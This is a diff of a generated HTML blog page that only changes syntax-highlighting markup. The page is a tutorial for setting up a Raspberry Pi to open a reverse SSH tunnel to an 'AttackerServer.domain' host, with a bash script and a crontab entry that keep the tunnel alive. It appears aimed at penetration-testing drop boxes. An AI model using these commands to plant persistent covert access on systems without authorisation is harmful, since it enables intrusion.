@@ -391,17 +391,17 @@ window.addEventListener("load", function(){
   <li>Copy the RSA key to the Server with:</li>
 </ul>
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>ssh-copy-id -i .ssh/id_rsa.pub lobs@AttackerServer.domain</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>ssh-copy-id <span class="nt">-i</span> .ssh/id_rsa.pub lobs@AttackerServer.domain</code></pre></figure>
 
 <p>If id_rsa.pub doesn’t already exists then:</p>
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>ssh-keygen</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>ssh-keygen</code></pre></figure>
 
 <ul>
   <li>The command to launch is:</li>
 </ul>
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>ssh -p 30022 -N -R 2222:localhost:22 pi@AttackerServer.domain</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>ssh <span class="nt">-p</span> 30022 <span class="nt">-N</span> <span class="nt">-R</span> 2222:localhost:22 pi@AttackerServer.domain</code></pre></figure>
 
 <p>This will ssh the Raspberry to the Attacker Server without specifying any command (-N) and tell the server to redirect ssh connection from local (server) port 2222 to remote (raspberry) port 22 (or whatever you want).</p>
 
@@ -417,7 +417,7 @@ window.addEventListener("load", function(){
   <li>Run the command:</li>
 </ol>
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>ssh -p 2222 -l lobs localhost</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>ssh <span class="nt">-p</span> 2222 <span class="nt">-l</span> lobs localhost</code></pre></figure>
 
 <h2 id="automation-and-persistence"><strong>Automation and Persistence</strong></h2>
 
@@ -427,15 +427,15 @@ window.addEventListener("load", function(){
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
 createTunnel<span class="o">()</span> <span class="o">{</span>
-  /usr/bin/ssh -N -R 2222:localhost:22 pi@AttackerServer.domain
-  <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -eq 0 <span class="o">]]</span>; <span class="k">then
+  /usr/bin/ssh <span class="nt">-N</span> <span class="nt">-R</span> 2222:localhost:22 pi@AttackerServer.domain
+  <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]]</span><span class="p">;</span> <span class="k">then
     </span><span class="nb">echo </span>Tunnel created successfully
   <span class="k">else
     </span><span class="nb">echo </span>An error occurred creating a tunnel. ReturnCode is <span class="nv">$?</span>
   <span class="k">fi</span>
 <span class="o">}</span>
 /bin/pidof ssh
-<span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne 0 <span class="o">]]</span>; <span class="k">then
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> <span class="nt">-ne</span> 0 <span class="o">]]</span><span class="p">;</span> <span class="k">then
   </span><span class="nb">echo </span>Creating new tunnel ...
   createTunnel
 <span class="k">fi</span></code></pre></figure>
@@ -444,7 +444,7 @@ createTunnel<span class="o">()</span> <span class="o">{</span>
 
 <p>To edit the crontab run: <strong>(Do not edit the crontab file directly)</strong></p>
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>crontab -e</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>crontab <span class="nt">-e</span></code></pre></figure>
 
 <p>And add at the end:</p>
 
@@ -482,6 +482,36 @@ createTunnel<span class="o">()</span> <span class="o">{</span>
 </article>
 <hr />
 
+
+    
+    
+        
+            
+        
+            
+        
+    
+        
+            
+        
+            
+        
+    
+
+    
+    
+        
+            
+        
+            
+        
+    
+        
+            
+        
+            
+        
+    
 
     
     
